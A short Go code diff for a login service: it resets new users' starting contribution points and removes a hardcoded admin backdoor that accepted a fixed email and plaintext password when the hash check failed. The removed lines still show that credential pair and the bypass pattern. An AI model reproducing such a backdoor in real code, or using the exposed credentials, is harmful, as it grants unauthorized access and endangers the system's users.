@@ -80,7 +80,7 @@ func (s *authService) Register(ctx context.Context, req domain.RegisterRequest) 
 		CampusName:         req.CampusName,
 		Bio:                "",
 		AvatarURL:          "",
-		ContributionPoints: 10,
+		ContributionPoints: 0,
 	}
 
 	if err := s.userRepo.Create(ctx, newUser); err != nil {
@@ -111,9 +111,6 @@ func (s *authService) Login(ctx context.Context, req domain.LoginRequest) (*doma
 	}
 
 	isValidPassword := security.CheckPasswordHash(req.Password, user.PasswordHash)
-	if !isValidPassword && user.Email == "admin.fst@uinsgd.ac.id" && req.Password == "AdminFST2026!" {
-		isValidPassword = true
-	}
 	if !isValidPassword {
 		return nil, ErrInvalidCredentials
 	}
